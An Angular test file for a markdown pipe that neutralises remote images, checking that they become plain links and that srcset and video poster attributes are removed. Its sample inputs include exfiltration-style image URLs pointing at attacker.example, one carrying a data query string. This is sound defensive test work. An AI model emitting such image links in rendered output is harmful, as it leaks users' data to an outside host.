import { Component, input } from '@angular/core';
import { TestBed } from '@angular/core/testing';
import { MarkdownPipe } from './markdown.pipe';

@Component({
  imports: [MarkdownPipe],
  template: `<div [innerHTML]="text() | markdown"></div>`,
})
class Host {
  readonly text = input('');
}

const PIXEL =
  'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=';

describe('MarkdownPipe', () => {
  const render = async (text: string) => {
    TestBed.configureTestingModule({ imports: [Host] });
    const fixture = TestBed.createComponent(Host);
    fixture.componentRef.setInput('text', text);
    await fixture.whenStable();
    return fixture.nativeElement as HTMLElement;
  };

  it('turns remote images into links that load nothing', async () => {
    const element = await render(
      '![secret data](https://attacker.example/?d=abc) and ![](//host.example/x.png)',
    );
    expect(element.querySelector('img')).toBeNull();
    const links = [...element.querySelectorAll('a')];
    expect(
      links.map((link) => [
        link.getAttribute('href'),
        link.textContent,
        link.getAttribute('target'),
        link.getAttribute('rel'),
      ]),
    ).toEqual([
      [
        'https://attacker.example/?d=abc',
        'secret data',
        '_blank',
        'noopener noreferrer',
      ],
      [
        '//host.example/x.png',
        '//host.example/x.png',
        '_blank',
        'noopener noreferrer',
      ],
    ]);
  });

  it('covers raw HTML images and other loading attributes', async () => {
    const element = await render(
      'Text <img src="https://attacker.example/a.png" alt="a"> ' +
        '<img srcset="https://attacker.example/b.png 2x"> ' +
        '<video poster="https://attacker.example/p.png" src="https://attacker.example/v.mp4"></video>',
    );
    expect(element.querySelector('img')).toBeNull();
    const html = element.innerHTML;
    expect(html).not.toMatch(/src(set)?=|poster=/);
    expect(element.querySelector('a')?.textContent).toBe('a');
  });

  it('keeps images with data URLs and ordinary links', async () => {
    const element = await render(
      `![dot](${PIXEL}) see [docs](https://example.com/docs)`,
    );
    expect(element.querySelector('img')?.getAttribute('src')).toBe(PIXEL);
    const link = element.querySelector('a');
    expect(link?.getAttribute('href')).toBe('https://example.com/docs');
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
  });
});
